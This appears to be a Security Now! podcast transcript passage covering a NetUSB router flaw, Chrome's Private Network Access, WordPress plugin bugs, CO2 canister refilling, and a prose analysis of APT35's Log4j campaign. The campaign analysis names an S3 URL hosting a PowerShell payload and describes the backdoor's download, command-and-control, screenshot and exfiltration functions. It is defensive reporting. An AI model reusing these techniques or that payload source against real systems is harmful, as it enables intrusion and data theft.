BleepingComputer was tracking this saga day to day and blow by blow.  On Thursday they reported that Microsoft had pulled the January Windows Server cumulative updates and were no longer accessible via Windows Update.  But as of that afternoon, Microsoft had reportedly not also pulled the Windows 10 and Windows 11 cumulative updates that were breaking L2TP VPN connections, and that was confirmed.  So it's unclear how that went.



This is all the mixed blessing of Windows Updates recently.  We're pushed to install them immediately with breathless, though in this instance unwarranted warnings of the sky falling from a server worm.  But installing these things through most of 2021 and continuing that trend into 2022 has resulted in the loss of mission critical functionality.  So, damned if you do, damned if you don't.  Actually, "don't" appears the increasingly attractive option given Microsoft's recent side effect-laden updates.  Let somebody else go there first, see if they survive.  And if so, then cautiously follow.



This is important, and everybody gets to participate.  Okay.  This is not good.  Okay.  So the bottom line is might be time once again to check for router firmware updates.



LEO:  Gosh darn it.



STEVE:  I know.  But you can go to grc.sc and this episode number:  grc.sc/854.



LEO:  854, yeah.



STEVE:  And that will tell you whether you're okay or not.



LEO:  Maybe.  Is it set up?



STEVE:  It should have given you more than that already.



LEO:  Let me go directly.  There we go.



STEVE:  Ah, there you go, yup.  



LEO:  [Crosstalk] my port 20005.



STEVE:  Yes.



LEO:  Okay.  That's not a port I'm familiar with.



STEVE:  Not a port anybody's familiar with.  Okay.  So...



LEO:  Uh-oh.



STEVE:  The security - yeah.  You're stealth.  Good.  The security research firm SentinelOne has discovered that some common code licensed by a number of prominent router manufacturers contains a highly critical, remotely exploitable flaw.  Among the routers known to be affected are those by Netgear, TP-Link, Tenda, Edimax, D-Link and Western Digital.



LEO:  Holy [indiscernible].



STEVE:  I know.  So here's what we know.  They, or rather he at SentinelOne, his name is Max, discovered a high-severity flaw in what's known as the, well, KCodes is the company, KCodes NetUSB kernel module used by that large number of network device vendors and affecting millions of end-user router devices.  This allows attackers to remotely exploit the vulnerability to execute code in the kernel.  SentinelLabs, Max's company, began the disclosure process last year on the 9th of September, and the patch was sent to licensee router vendors on the 4th of October.  So it should be incorporated into router firmware updates by now.  That's more than 90 days.  At this time, SentinelOne has not discovered evidence of in-the-wild abuse.



Okay.  So here, in the author's voice, is how this all began.  He said:  "As a number of my projects start, when I heard that Pwn2Own Mobile 2021 had been announced, I set about looking at one of the targets.  Having not looked at the Netgear device when it appeared in the 2019 contest, I decided to give it a lookover.  While going through various paths through various binaries, I came across a kernel module called NetUSB.  As it turned out, this module was listening on TCP port 20005 on the IP 0.0.0.0.  Provided that there were no firewall rules in place to block it, and typical consumer routers don't have any, that would mean it was listening on the WAN as well as the LAN."  And he says:  "Who wouldn't love a remote kernel bug?



"NetUSB is a product developed by KCodes.  It's designed to allow remote devices in a network to interact with USB devices connected to a router.  For example, you could interact with a printer as though it is plugged directly into your computer via USB.  This requires a driver on your computer that communicates with the router through this kernel module."  And of course you don't have to be using this to have it there, alive and running, in your router, if it just has that NetUSB feature which they licensed, the router manufacturer licensed from KCodes.



Okay.  He then proceeds to provide a detailed takedown description of his successful hunt for a critical vulnerability in the KCodes code.  He discovered a dangerous switch function driven by a command type that's provided by the user, and the rest does not end well.  I've provided a link in the show notes for anyone who wants all the gory details.  So it's insane.  And it is so wrong that this buggy KCodes service is bound to the router's WAN interface.  Essentially, 0.0.0.0 is all interfaces on the stack as opposed to if it were bound to 192.168.0.1 or .1.1, that is, bound to the gateway interface.  Then it would only be listening on local ports inside the LAN, which is what everyone wants.



Nobody wants this thing listening on the WAN.  But it turns out by default it is.  That means it is instantly discoverable by bad guys anywhere, and of course by Shodan.  It also means that it's instantly testable, as we started out talking about, by any port probe, and I just happen to offer a free online port probing service.  So the other link I've provided is a grc.sc shortcut to instantly allow our listeners and anyone to check any router they're behind for this vulnerability.



Open your browser and just put in grc.sc/854, this week's episode number.  This will jump you to GRC's ShieldsUP! custom port probe, preloaded to check port 20005.  You'll see on your browser screen it sends a bunch of TCP SYN packets spread out over a few seconds.  I think it's five seconds.  I send one every half second so as not to overload anything and to redundantly send TCP SYNs to make sure that we'll see if we get back a SYN ACK.  That will be sent to the IP address also shown on that page to quickly and privately check your browser's publicly exposed WAN interface to determine whether it's accepting incoming TCP connections over port 20005.  It should not be.  If it is, unplug it.  I mean, really, unplug it.  Or if you can, add a firewall rule, if your router allows you to, to explicitly block that port on the WAN interface until you're able to update your router's firmware.  Hopefully an update is available.



As I said, Max, who discovered and responsibly disclosed this and waited patiently for more than 90 days until last Tuesday the 11th before going public with it, finished his disclosure by writing:  "This vulnerability affects millions of devices around the world and in some instances may be completely remotely accessible.  Due to the large number of vendors that are affected by the vulnerability, we reported this vulnerability directly to KCodes to be distributed among their licensees instead of targeting just, for example, the TP-Link or the Netgear device in the contest.  This ensures that all vendors receive the patch instead of just one during the contest.  While we're not going to release any exploits for it, there is a chance that one may become public in the future despite the rather significant complexity involved in developing one.  We recommend that all users follow the remediation information above in order to reduce any potential risk."



And we have another example of something good that came from the Pwn2Own competition.  Now, let me just say I did read in detail his posting.  He did not develop an exploit, but he walked anybody who's competent right up to one.  Also, because this is a common code across a large number of routers, all Linux-based, the tools are there for developing it.  That means that if you create one exploit, you literally, you're getting millions of devices which are trivial to find.  And you're able to execute your own code on those all common Linux platforms.  So it's not just one make and model.  It's just not one make.  It is cross-vendor.  This is really going to be juicy.  



LEO:  Now, to be clear, if it says "closed," are you okay, instead of "stealth"?



STEVE:  Yes.



LEO:  Obviously "open" is bad.



STEVE:  Yes, open is the bad news.  Closed is fine.



LEO:  Oh, okay.



STEVE:  Yeah, closed is fine.  All it means is that your router bounced back a no...



LEO:  It responded, yeah.



STEVE:  Exactly.  Exactly.  Probably sent back a TCP reset saying I got your probe, but I'm not open for business.  That's fine.  Stealth is cooler.  It just means that no response was returned.  It's no one's business that there's even anything at that IP listening.  Open is the danger.



LEO:  And you can't do this from outside your house.  You have to do it from within.



STEVE:  Correct.  Correct.  I did that.  That's clearly the design intent of ShieldsUP! because otherwise it would allow bad people to probe other people's IPs.



LEO:  Not good, yeah.



STEVE:  And that would have been not good, yes.  Yeah.  So you've got to do it from the LAN, which you want to verify.  But just, again, this is not a small thing.  Let me please encourage our listeners, grc.sc/854.  If you're at work, and you've got a family member or kids at home, give them a call.  Have them do this.  You definitely want - this thing, there's no way this is not going to be exploited.  There's no way because it's Linux, because it's cross-router vendor.  There's just no way this is not going to end up getting exploited.



Okay.  Chrome is going to be limiting its access to private networks.  And this is a win and a half.  It will soon be implementing, probably the first of the Chrome, well, the Chrome, Chromium, we can hope that Safari and Firefox follow, a newly proposed web standard which is known as Private Network Access, or PNA.  If anyone's interested, I've got a - it's a W3C standard, just like I think it was January 2nd was the date on this, so the ink is not dry, or the HTML not yet set.  I've got a link in the show notes.  



It will apply new and welcome, in my opinion, controls to block external Internet websites from querying and interacting with devices and servers located inside local private networks.  We've talked about this problem a number of times already.  As I mentioned, this change will occur as Chrome implements this new W3C spec known as Private Network Access.  It'll be rolled out in the first half of the year for Chrome.  PNA adds a mechanism through which external Internet sites must first ask systems inside local networks for explicit permission before being allowed to have any sort of connection.  Okay, now, that's what some of the coverage says, and it's not exactly the way this works.  What happens is Chrome will notice when an external Internet-based server is doing something that requires internal access.  And then Chrome will take responsibility for saying, wait a minute.  Let's see if that's okay. 



Okay.  So Chrome and any other PNA-compliant browsers will first send what's known as a "CORS preflight request."  CORS is Cross-Origin Resource Sharing, a nice addition to the web standard for controlling who gets to talk to whom cross-origin.  So Chrome will first send what's known as a "CORS preflight request" to the local server or service, whatever it is on the LAN, before granting any Internet-originating request for a private network resource.  This CORS request will ask for and needs to obtain explicit permission from the internal target server or service.  The preflight request, which is just a fancy name for an extra header, is a new header.  It is Access-Control-Request-Private-Network: true is what Chrome sends out.



And the response to it must also contain a header:  Access-Control-Allow-Private-Network: true.  If the targeted local devices such as servers or routers fail to respond, Internet websites will be blocked from connecting, as they never should probably be allowed to anyway.  I can't imagine what that's used for.  Maybe there is a legitimate use.  We know it's been exploited a lot.  So this is a wonderful improvement in cross-origin access control.



As we know, and have devoted a number of podcasts to explaining, bad guys have figured out that they can use a browser as a proxy to relay connections to an individual's or a company's internal network.  For example, a malicious website could contain code that tries to access an IP address like 192.168.0.1, which will often display the LAN router's local admin logon page, which is only accessible by design from the router's LAN interface.  But because the request is coming from the user's browser on the LAN, the router assumes that the user wants to log in.  So as we've seen, when unwitting users access a malicious site, it's been possible to induce their browser to make a request to their router without their knowledge.  This can send malicious code to bypass the router's authentication and modify router settings.  It's happened.



Variations of these Internet-to-local network attacks could also target other local systems such as internal servers, domain controllers, firewalls, or even locally hosted applications.  So by introducing the PNA specification inside Chrome, and within Chrome's permission negotiation system, Google will be moving to prevent such automated attacks.  And I say yay.



According to Google, a version of PNA has already been slipped into and shipped with Chrome 96, which was released back last November.  But full support will be rolled out in two phases this year, with Chrome 98 in early March and Chrome 101 scheduled for late May.  In this coming March's Chrome 98, Chrome will begin sending these preflight requests ahead of private network subresource requests.  These preflight failures will only display warnings in the DevTools of the browser, without otherwise affecting the private network requests, so they remain allowed and unblocked.  So this, you know, this gives devs who are wanting to bring up support for this affirmative information about the fact that this is going on.



Chrome gathers compatibility data and reaches out to the largest affected websites.  So Chrome will be using this for instrumenting their own research.  And if it turns out that there are major websites doing this, they'll notify them that, hey, you know, this is going to start getting blocked here before long.  Google expects this to be broadly compatible with existing websites.  And, yeah, why wouldn't it be?  It doesn't break anything yet.



Then, no earlier than late May's scheduled Chrome 101, assuming that established compatibility data indicates that the change will be safe enough and that sufficient outreach has successfully occurred, Chrome will begin enforcing that preflight requests must succeed, and it will otherwise fail those externally sourced requests.  They said a deprecation trial will start at the same time to allow for websites affected by this phase to request a time extension.  The trial will last for at least six months.



So the concern that's evidenced here is that, as is always the case, tightening up security may break something that was happening, little known and unseen, in the background.  But overall, this is a welcome improvement.  If there is something on the LAN that really does intentionally wish to be able to receive and respond to requests originating from the user's browser, but triggered from an external source, then such devices will need to be updated with an awareness of these new forthcoming PNA controls.  And that simply entails replying with the newly added header to continue enabling what had always been allowed before.  So not a big change to make.  Easy to do.  And I just think this is a big useful step forward.  And actually it was a couple of Google guys who apparently were responsible for getting this thing through the W3C.  So props to them.



I'll just finish with three high-severity flaws, you know, just mentioning them, in WordPress.  As I mentioned at the top of the show, as a consequence of these three, 84,000 WordPress-based websites are affected, and they're very serious.  The guys at Wordfence titled their disclosure "84,000 WordPress Sites Affected by Three Plugins With the Same Vulnerability."  They wrote:  "On November 5th, 2021" - so November of last year - "the Wordfence Threat Intelligence team initiated the responsible disclosure process for a vulnerability we discovered in 'Login/Signup Popup,' a WordPress plugin that is installed on over 20,000 sites.  A few days later we discovered the same vulnerability present in two additional plugins developed by the same author:  'Side Cart WooCommerce,' installed on over 60,000 sites; and 'Waitlist WooCommerce,' the back in stock notifier which is installed on over 4,000 sites.  This flaw made it possible for an attacker to update arbitrary site options on a vulnerable site, provided that they could trick a site's admin into performing an action, such as clicking on a link."



They said:  "We sent full disclosure details on November 5th, 2021, after the developer confirmed the appropriate channel to handle their communications.  After several follow-ups, a patched version of 'Login/Signup Popup' was released on November 24th, while patched versions of 'Side Cart WooCommerce' and 'Waitlist WooCommerce' were released on December 17th."  So they waited 90 days again, and now they're, well, December, yeah, not in that case.  But they gave time to get these things pushed out and updated.



They said:  "We strongly recommend ensuring that your site has been updated to the latest patched version of any of these plugins, which is version 2.3 for 'Login/Signup Popup,' version 2.5.2 for 'Waitlist WooCommerce,' and version 2.1 for the 'Side Cart WooCommerce' at the time of the publication."  So anyway, just a heads-up.  When I hear that something like WooCommerce is running on WordPress, wow, you know, we hear about commerce sites being attacked all the time, and WordPress is not a place you want to do something that is really security sensitive.  Blogs and comment scrolls and comment threads, that's one thing.  But more than that, I don't know.



Okay.  A couple closing-the-loop pieces.  Peter Morelli said:  "'Expanse' season complete.  You'll love it."  So I just wanted to note to our listeners who are interested, if you've been waiting before you jump on the final season of "Expanse," I have been waiting.  So Peter, thank you for that.  I wanted to let everybody know.



Chris Miles, or Milesey, he said:  "Steve, have you guys seen the huge QNAP vulnerability that has ended up with hundreds of thousands of units infected with ransomware code?  Even a unit of mine with strong passwords was hit.  Thankfully, one-way versioned backups meant nothing was lost."  And I'll just - I wanted to take this opportunity.  Thank you, Chris, for the heads-up.  I keep trying to get to it in the show, but there's been so much else to talk about.



You know, we said before there is available non-QNAP open source software that looks like it does a much better job.  QNAP just perennially seems unable to get their act together here.  They've have one serious remote code execution problem after another.  So at some point just go find the - I don't remember if it's FreeBSD based, or OpenBSD, or what it is.  But it's one of them that you can run on the QNAP system in order to do network attached storage features and just get away from QNAP's solution.  Hardware, yes.  Software, apparently not.



Okay.  Two listeners via DM, so I didn't put their name in since DM is inherently private, and I wasn't sure they wanted me to disclose who they were.  First one said:  "Hi, Steve.  I was intrigued by your mention of refilling the SodaStream bottles in last week's SN-853.  I use SodaStream a lot to replace buying soda," he says, "(called 'Sparkling Water' here in the oh-so-pretentious U.K.) in plastic bottles, but the refills" - meaning of SodaStream - "are expensive.  Do you refill from brewing gas bottles or some other source?"



And Listener 2:  "Hi, Steve.  Would you be so kind as to share the link to the SodaStream refill adapter you're using?  I would very much appreciate it.  And of course I will keep this confidential."  I apparently will not, although I did keep his name confidential.  So anyway, for those who don't know, this interest was stirred up by Leo and me talking about the fact that I have been for years refilling my empty SodaStream steel CO2 canisters.  For a while I was taking them to my local, what is it, Ace Hardware was a provider.  You know, they talk about how easy it is to swap the canisters.



Well, you take your empties back, and it may be easy, but it sure ain't inexpensive.  And after a while, I don't know how it occurred to me, but I thought, you know, I wonder if there's a way to refill these.  So a little bit of googling, sure enough.  There is a common source of food-grade CO2.  You want to make sure you get, like, food-grade everything.  And that's people who do home brewing.  It turns out about a mile from me is a nice little home brewing retailer on Bristol Avenue in Costa Mesa.  And I guess it's more than a mile, but still it's convenient.  And home brewing people use CO2.  And so on Amazon I purchased first a 20-pound CO2 canister with a siphon.  That's important.  The siphon is a key, unless you want to have your big canister upside down.



The siphon just - it's just a little tube that runs down to the bottom of the tank so that it's pulling liquid CO2 from the bottom out the spigot as opposed to taking the gas off the top.  So you get that.  That's $150 if you're interested.  And then a refill adapter is nothing but a cleverly simple threaded, it's female threads on both sides.  So you screw one end.  It's got the proper threads for the standard CO2 connection.  And then on the side that's facing outward is the threading that matches the universal SodaStream bottles.  And so basically all this does is it just mates a now-empty SodaStream bottle to the liquid CO2-filled big 20-pound refillable at your local source of CO2 bottle.



LEO:  I would just caution people, because I did this, bought all this, and I'm still looking.  But Russell, who is a home brewer, says it used to be he could bring his bottles in, and they would fill it.  Now they exchange them at the places he's gone, for some crap tinted up bottle, or they require this whole testing process before they'll do it.  They say leave it here, and you can come back tomorrow, that kind of thing.  So I would check, before you jump whole hog into this, to make sure you do have a good source of CO2 that you can use to refill it.  You know, call around.



STEVE:  Very good.  Very good, Leo.



LEO:  Because apparently, you know, and I'm not surprised, these guys, they're kind of - maybe because of COVID, they're tired of dealing with people.  I don't know.  It's getting maybe a little harder to get these filled.



STEVE:  That's interesting.



LEO:  You're lucky, you've got somebody who can do it.



STEVE:  Yeah, and they're nice people, and they're glad to see me.



LEO:  Bring them candy.  Yeah, exactly, they like you now, so they trust you, yeah.



STEVE:  So I thought I would share a couple pointers, and then we won't talk about this again.  First is you absolutely want your SodaStream empty canister frozen.  That is, what we do is we have like a spare freezer, and so it's got our empties in there.  You'll want to refill them when they're cold.  That minimizes the re-expansion of the liquid CO2, and you get a much fuller bottle.  The second is that the top of the SodaStream, basically it's got a little push valve that when you push the SodaStream down, a pin pushes down in the center in order to release the compressed CO2.



LEO:  They charge so much money for what is essentially a mechanical lever, a plastic thing with a mechanical lever, because all it's doing is pushing in the button, and it goes in the spout, and it goes into your soda bottle.



STEVE:  That's right.  However, the one gotcha here is that if that is pushed too far in, it stops again.  So the trick of refilling these is to bleed it in.  If you hook everything up and just open the main valve, nothing happens.  You'll hear, like, eh, and then it's like stopped.  So what I've learned is, first of all, cool the receiving canister.  And then just ever so slightly twist the valve open, and you'll hear the sound of gas or fluid flowing.  That's all you need to do.  Walk away, as I mentioned jokingly but actually sincerely last week.  Don't stand directly in front of it.  That's just, I mean...



LEO:  Especially at crotch height.



STEVE:  It is at crotch height, so...



LEO:  Could impede your propagating, so don't do that, yeah.



STEVE:  It would limit even practicing.



LEO:  Yeah.



STEVE:  Yes.  So, and it takes, you know, a couple minutes.  And if it slows down, then you can creep the valve open again and restart the little "eeeeee" sound.  But, boy, it's just so gratifying.  When you're unable to put any more in, you turn off the main valve, remove the cylinder.  It is heavy because it is now filled with liquid CO2, and then you're good to go for a whole long - and I think I paid $14 to have this 20-pound big, big floor-standing canister refilled, which beats the hell out of going and buying new canisters from, I mean, and because we love SodaStream.



LEO:  Oh, yeah.  The idea is to save money, in the long run anyway.  So, yeah.  And eliminate single-use plastic bottles.



STEVE:  Yes.



LEO:  That's why we got it, yeah.



STEVE:  Okay.  So Sunday evening, night before last, after a weekend spent scratching my head and experimenting with an older motherboard which I had purchased through eBay in order to duplicate what at least one of our testers had seen, I figured out what was going on and adjusted SpinRite's core technology to accommodate it and any other similar systems.  The trouble I had been having was occurring due to Intel's 82371 PCI-TO-ISA / IDE XCELERATOR, as they call it.  It's known as the PIIX4.  And the chip's spec is dated April of 1997.  So, yeah.



Getting this v6.1 release of SpinRite to run everywhere is turning out to be far more work, and I'm not surprised, since the whole point of 6.1 is to bypass the BIOS and talk directly to the hardware.  The BIOS may not have been terrific for performance, it did not have performance on its side, but it does have compatibility.  I knew that this was likely to be where a lot of time was going to be spent.  Fortunately, we have a really amazing group of development testers.  The instance of GitLab that I brought up in mid-December currently has 241 registered participants.  So by far, most of them watch and silently test the code as it evolves.  If it does something wrong, then I'll hear about it.  But it's very gratifying to know that SpinRite is receiving this level of pounding at this stage.



Yesterday, or day before yesterday, rather, in that end-of-the-weekend's work update, I posted to the newsgroups.  I said:  I think that with the Supermicro, the Asus EEE PC 901, and now millQ's 82371 chip issues all resolved, that's the last of the big mystery behavior problems.  This just leaves me with a bunch of less interesting and already understood things to fix and clean up.  Once those are finished, I think we'll be ready to thoroughly pound on what we have to see whether anything else falls off.  It feels like we're getting close to having this operational foundation fully functional.  So that will be a major milestone.



We will get to a point where the code I have is identifying every drive that everybody has connected using every controller on every system they have correctly and running benchmarks on those to demonstrate that it's able to talk to the drive.  And part of that is a read/write test which I perform way out at the far end of the drive.  And at that point it's just time to basically finish SpinRite.  That is, all of this hardware compatibility layer will be resolved, and I get to move forward, you know, update the screens to hold larger numbers and that kind of thing.  And so it'll be a nice milestone to get to.  And we're probably within a week or two of that.  So yay.



LEO:  I see the SodaStream bottle.



STEVE:  That was my SodaStream bottle I was drinking from.



LEO:  I see Steve's SodaStream.  And of course he has the world's largest SodaStream bottle.



STEVE:  Okay.  So many security firms are tracking threat actors who immediately and predictably jumped aboard the Log4j bandwagon.  You know, it's been a feeding frenzy for the security firms.  To help bring this home and make it a bit more real, I wanted to share a piece of Check Point Research's reverse engineering work on a typical threat the Internet is now facing.  I've got, for anyone who wants more detail, as always, a link in the show notes.



Last week, Check Point documented the efforts of an Iranian government-backed group known, again, not just Iranians, Iranian government-backed group known as APT35, also known as Charming Kitten, TA453, and Phosphorus.  This group started widespread scanning and attempts to leverage the Log4j flaw in publicly facing systems only four days after the vulnerability was disclosed.  And all the bad guys knew, now that this was public, it was going to get remediated at some speed, the point being let's be first.  You know, get in there before the back doors get closed.



Since this particular actor's setup was hurried, they simply grabbed one of the publicly available open source GitHub-hosted JNDI exploit kits.  Yes, they were on GitHub initially.  But that kit has been removed from GitHub due to its enormous popularity following the vulnerability emergence.  Why bother reinventing that particular wheel when time is of the essence? They also based their operations upon their preexisting infrastructure, rather than like creating a whole new one, and that infrastructure was already well known to Check Point, thus making its detection and attribution all the easier.



In the show notes I have a flow chart which shows the path that the exploit takes.  And it could hardly be any easier or direct.  First, the attackers send a crafted request to the victim's publicly facing Internet-exposed resource, whatever it is, a server of some sort.  In this particular case the weaponized payload was sent in through either the user-agent or the HTTP authorization headers.  Remember that all that needs to happen is that something somewhere that's Java-based logs part of the query that contains this weaponized string.  In order to log the query, Log4j examines what it's logging, sees a JNDI component, and goes about its job of obtaining the content from the LDAP URL contained in the query which is being logged.



So the vulnerable machine, as it's been instructed to do basically, although not after it's been patched, but until then, reaches out to what they labeled in their diagram a Log4j Exploitation Server, which assembles and returns a malicious Java class which will be executed on the vulnerable machine.  The class runs a PowerShell command with a Base64-encoded payload.  And I actually have a picture of the actual payload, the exploit dot command, powershell, and then the encoded payload.  That PowerShell command downloads a PowerShell module from an Amazon S3 bucket URL, and it actually is  https://s3.amazonaws.com/doclibrarysales/test.txt, and executes it.  And we have a picture of that in the show notes, the actual thing that's downloaded.



The downloaded PowerShell payload is the main module that's then responsible for basic communication with the command-and-control server and the execution of additional modules which may be received.  So the main module performs the following operations.  It validates the network connection.  Upon execution, the script waits for an active Internet connection by repetitively making HTTP POST requests to google.com with the parameter hi=hi, just to see if it can succeed.  That's how it detects whether or not it's got an Internet connection.  Assuming that it does, it knows that.



It also performs basic system enumeration.  It collects the Windows OS version, the computer's name, and the contents of a file Ni.txt in $APPDATA, in the $APPDATA path.  The file is presumably created and filled by different modules that will be downloaded by the main module.  It then retrieves the command-and-control server's domain.  The malware decodes the command-and-control domain retrieved from a hardcoded URL located in the same S3 bucket from where the backdoor was downloaded.  So the bad guys have dynamic control over that by deciding what goes in this AWS bucket.  It also retrieves, decrypts, and executes follow-up modules.



Okay.  So once all the data is gathered, the malware starts communication with the command-and-control server at the domain which it determined by pulling that from the Amazon AWS cloud bucket.  And it does that, it communicates with the command-and-control server by periodically sending HTTP POST requests, I mean, none of this is high tech.  None of this is rocket science.  This is easy to do, which is why this terrified everybody so much.  So this thing sends HTTP POST requests to a pre-configured URL with each POST request containing information from which to build a session key:  the OS version, the computer's name, and the contents of that file in the $APPDATA directory.  So that ends up being something unique which it uses to identify itself each time.  And I think as I recall it puts it in a session header in the POST query.



In response to the command-and-control server's receiving these POST requests, it can either choose not to respond, in which case the script will keep sending POST requests periodically to continue to provide the server with a stream of response opportunities, or the server will return a Base64-encoded string.  Now, just as a reminder, Base64 is a means for sending binary data over an ASCII channel, that is, over a text-only channel.  Groups of three 8-bit binary bytes, so three 8-bit binary bytes is 24 bits, they're regrouped from three 8-bit bytes to four 6-bit bytes.  Six bits can have 64 combinations.



So we take the lower and the upper alphabet, gives us 2x26 characters, or 52 characters.  We add the 10 decimal digits.  That brings us up to 62 characters.  And then we toss in two additional ones, the plus and the forward slash, which brings us to 64.  So in groups of three, binary is taken from the source binary.  Those 24 bits are regrouped into four characters, each one of 64 different possibilities.  That's then all munged back together and sent down with the client, which reverses the encoding process to restore the original binary.  This allows the malicious server to squirt anything it wants into the victim machine that's making the queries.  The modules downloaded in this fashion are either PowerShell or C# scripts.



The modules sent by the command-and-control server are executed by the main module, with each one reporting data back to the server separately.  So the original module comes in, looks around, sets up shop, figures out who to talk to, initiates the dialogue, and does that periodically.  If in response to one of its multiple POST queries it receives a blob of Base64, it goes, oh, okay, something to do.  It decodes it back into whatever it was before, you know, removes the Base64 encoding - we know that that's going to be a PowerShell or a C# script - and runs it.



At that point that subsidiary module takes off on its own, and it establishes its own communication directly with the command-and-control server.  The command-and-control cycle continues indefinitely, which allows the threat actors to gather data on the infected machine, run arbitrary commands, and possibly escalate their actions by performing a lateral movement or executing follow-up malware such as ransomware.  In other words, this thing can do anything it wants to, once it gains a foothold.



So the modules.  Every module is auto-generated by the attackers based on the data sent by the main module.  Each of the modules contains a hardcoded machine name and a hardcoded C&C domain.  Every module Check Point observed contained a block of shared code, which makes sense because there's a bunch of stuff that they're all going to do regardless of their specific function.  And that is encrypting the data to be sent; exfiltrating the gathered data through a POST request or uploading it to an FTP server, that also happens; and sending execution logs to a remote server.



In addition to this, each module performs one specific job, that is, in addition to those things they all have in common.  Check Point retrieved and analyzed modules for six different functions:  listing installed applications, that is, applications installed on the machine; taking screenshots; listing the running processes; getting OS and computer information; executing a predefined command from the command-and-control server; and then, finally, cleaning up any traces created by any of the other modules.



The applications module uses two methods to fetch and return a list of installed modules.  It can either enumerate the Uninstall registry values or use the Windows Management Instrumentation command in order to get an enumeration.  It gets those, encrypts them, and sends them back to headquarters.



The screenshot module, they found both C# and PowerShell scripts for the screenshot.  They both have the capability to capture multiple screenshots at specified intervals and upload the resulting screenshots to an FTP server whose credentials are provided by the script.  The C# script uses a Base64-encoded PowerShell command to take the screenshot from multiple screens.  So again, you might have this thing in your computer, not know it.  You're doing things, and this thing is spying on you, sending shots of your screens back to headquarters.  The processes module obtains a list of the machine's running processes using the tasklist command, gathers them, encodes them, sends them back.



The system information module contains a bunch of PowerShell commands.  What was interesting was that in the instances that Check Point saw, the bad guys had commented out all of these potential sources of information.  They just weren't using it.  This told Check Point that this whole campaign was hastily assembled since the entire, as we know, attacker community was  well aware that systems would be closing their doors very quickly.  So there were all these different suggestions of the moment this thing went public the attackers jumped on it and said let's quickly get something together that we can exploit this with.



And finally, we have the command execution module, which is able to essentially download and execute any actions, any commands that are provided by the command-and-control server.  They saw, for example, listing the contents of the C: drive root; listing the specific WiFi profile details using netsh, the WLAN subcommand of that.  And also listing all the drives using Get-PSDrive, a PowerShell enumerator.



And finally, the cleanup module.  It's dropped after the attackers have finished their activity and want to remove any traces that they've been inside the system.  The module contains cleanup methods for persistence-related artifacts in the registry and the startup folder, any files created, and any running processes.  It contains five hardcoded levels of sort of like stages of cleanup, depending upon the stage of the attack, each one serving a different purpose.  Check Point said that the design and the intent of the cleanup module made it clear that the threat actors want to keep the infection on the machine, first of all, for as long as they deem necessary.  But then once their goal has been achieved, they want to disappear without a trace so that no one believes that an attack occurred.



As for attribution, of course we know attribution of network remote attacks often falls somewhere between difficult to impossible, but not so in this case.  Most advanced persistent threat actors put some effort into making sure to change their tools and their infrastructure to avoid being detected in the first place and to make attribution much more difficult if they were detected.  And in fact we know that the SolarWinds attacks were famous for, like, really working to obscure the path by which the infection happened if it were to be discovered.  However, APT35 does not conform to this behavior.  Apparently the group is famous within the cybersecurity community for the number of operational security mistakes they've made in previous operations, and they tend not to put too much effort into changing their infrastructure once it's been exposed.  So it's little wonder that their operation, as Check Point has detailed it, has significant overlaps in the code and the infrastructure which previously identified the activities of APT35.



As for code overlaps, four months ago, in October of 2021, Google's TAG team, remember, their Threat Analysis Group, published an article about APT35's mobile malware.  You know, because Google and Android.  Even though the samples Check Point analyzed were PowerShell scripts - meaning PowerShell as opposed to Android, so Windows only - the similarity of coding style between them and the Android spyware that Google attributed to APT35 immediately caught Check Point's attention.



For one thing, the implementation of the logging functions was identical between the Android App which Google analyzed and this present campaign's PowerShell modules which use the identical logging format, even though the commands are commented out and replaced with another format.  The fact that these lines were not removed outright, Check Point felt, might indicate that the change was done only recently.  And the syntax of the logging messages themselves being logged is identical.



As for infrastructure, both then and now campaigns, October and now, apparently use the same server-side infrastructure.  When a client POSTs data to a remote HTTP server, the server-side path of the query is called the "API endpoint."  Google's mobile analysis and Check Point's both revealed the use of the common endpoint "/Api/Session."  Now, okay.  That's not a high-entropy name.  Could have just been a collision of convenience.  But Check Point felt encouraged by the observed overlap, and they stated in their report that other API endpoints are similar but not entirely identical due to the differences in the functionality of the platform.  So didn't make sense for them to be completely identical.



Check Point also observed that not only are the URLs familiar, but the command-and-control domain of the PowerShell variant responds to the API requests that are used in the mobile variant.  This suggests similar, if not identical, server-side support for both campaigns.



So Check Point concluded its report by observing that every time there is a new published critical vulnerability, the entire Infosec community holds its collective breath until its worst fears come true.  Scenarios of real-world exploitation appear, especially by state-sponsored actors.  As they demonstrated in their report, the breath-holding wait in the case of the Log4j vulnerability was only a few days.  The combination of its simplicity, its publicly available open source code samples, and the massively tantalizing number of vulnerable devices made this a very attractive vulnerability for actors such as APT35.  And I have no doubt that, while I don't think I will continue giving this in-depth coverage because we know pretty much everything there is to know about it, well, if something major happens, it'll certainly be newsworthy.  But that's how this stuff works.  Again, just it's frightening how non-rocket science, how script-kiddie level this thing is, and that it can get up to so much mischief.



LEO:  It's amazing.  Even a, what is it, a kitty, what kind of kitty, Charming Kitten?  Even Charming Kitten can do it.  Who comes up - is that like a Vulnonym?  Who comes up with, I mean, there's Fancy Bear for the Russian group, Charming Kitten for the Iranian group.  Somebody's coming up with these.



STEVE:  Yeah, I don't know.



LEO:  Must be the CIA or the NSA.  That's just wild.  Steve, you did it again.  Here we are at the end of another fabulous episode.  If you would like to know more, Steve has the show notes at his website.  It's not all that's there.  There's a lot of stuff at GRC.com, including that ShieldsUP! test where you could test your port 22009?  What was it?  Some...



STEVE:  Please do.  20005.



LEO:  20005.



STEVE:  So it's grc.sc/ our episode number, 854.  



LEO:  Okay.  Actually, every time I set up a new router or a new network, I use ShieldsUP! to check, make sure it's properly configured.  It's a very useful tool.  One of many things Steve gives away.  The only thing he doesn't, that's his bread and butter, SpinRite, his very, very popular mass storage maintenance and recovery utility.  If you don't have a copy, you really ought to have one.  If you get 6.0, the current version right now, you get a free upgrade to 6.1.  It's imminent.  You can help in the development of it, as well.  There's a forum there.  All of that at GRC.com.



16Kb versions of the show audio, as well as 64Kb audio versions of the show are there.  The transcripts, which are very handy if you like to read while you listen, or just to search through to find a particular part of any given show.  All at GRC.com, and lots of other stuff, as well.



We have 64Kb audio versions and full video, as well, if you want to watch, available at our site, TWiT.tv/sn.  There's a YouTube channel dedicated to Security Now!.  All the videos, all the time.  You can also subscribe in your favorite podcast player, because it is a podcast, and download it automatically.  Or even go to the website, TWiT.tv/sn, and download it from there.



If you subscribe in a podcast player, you get it automatically, which is probably a good idea because this is one of those shows where I think you want all the episodes; right?  You can go back at the website to Episode 1 and come forward from there.  The feeds only have the last 10 episodes for reasons of economy, but that'll get you started, anyway.  So look for Security Now! in your favorite podcast player.



